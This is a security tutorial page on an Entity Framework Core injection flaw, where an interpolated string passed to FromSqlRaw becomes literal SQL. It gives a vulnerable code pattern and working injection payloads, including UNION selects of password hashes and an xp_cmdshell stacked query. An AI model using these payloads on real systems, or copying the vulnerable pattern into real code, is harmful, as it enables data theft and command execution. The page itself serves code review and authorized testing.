---
title: "Entity Framework string interpolation injection: FromSqlRaw with an interpolated string"
description: Passing a C# interpolated string to FromSqlRaw/ExecuteSqlRaw evaluates the interpolation before EF sees it, so user values become literal SQL—unlike FromSqlInterpolated which parameterizes.
keywords:
  - Entity Framework
  - string interpolation injection
  - FromSqlRaw
  - FromSqlInterpolated
  - C# interpolated string
  - SQL injection
---

# String interpolation injection

This is a subtle EF Core footgun. C# interpolated strings (`$"... {x} ..."`) and EF's `FromSqlInterpolated`/`ExecuteSqlInterpolated` look almost identical to `FromSqlRaw`, but they behave very differently—and mixing them is a reliable source of SQL injection.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Why it happens

- `FromSqlInterpolated($"... {userInput} ...")` captures the interpolated string as a `FormattableString`. EF converts each `{...}` hole into a **`DbParameter`** — safe.
- `FromSqlRaw($"... {userInput} ...")` receives a **plain `string`**: the interpolation is performed by the C# runtime *before* EF is called, so `userInput` is already baked into the SQL text. EF sees only the final string and runs it verbatim — injectable.

So the exact same `$"..."` syntax is safe with the `Interpolated` method and injectable with the `Raw` method. A developer who refactors from `FromSqlInterpolated` to `FromSqlRaw` (or copies the wrong overload) silently introduces injection.

## Vulnerable pattern

```csharp
// Interpolated string handed to the RAW method → injectable
var q = $"SELECT * FROM Users WHERE Id = {userInput}";
var users = db.Users.FromSqlRaw(q).ToList();

// Equivalent inline footgun
db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'");
```

## Exploitation

Because the interpolated value is literal SQL, exploit it as ordinary injection in its context. Numeric `Id`:

```
1 OR 1=1
0 UNION SELECT Id, Username, PasswordHash FROM Users
```

Quoted `Name`:

```
' UNION SELECT Id, Username, PasswordHash FROM Users --
'; EXEC xp_cmdshell 'whoami' --
```

SQL Server stacked queries (`;`) are available over the EF connection, enabling data modification and, where configured and privileged, command execution. Identifying which overload is in use (`Raw` vs `Interpolated`) during review tells you immediately whether the `$"..."` is a vulnerability or a safe parameterization.

## References

- [EF Core docs: Raw SQL queries — parameterization](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries#passing-parameters)
- [PayloadsAllTheThings: MSSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
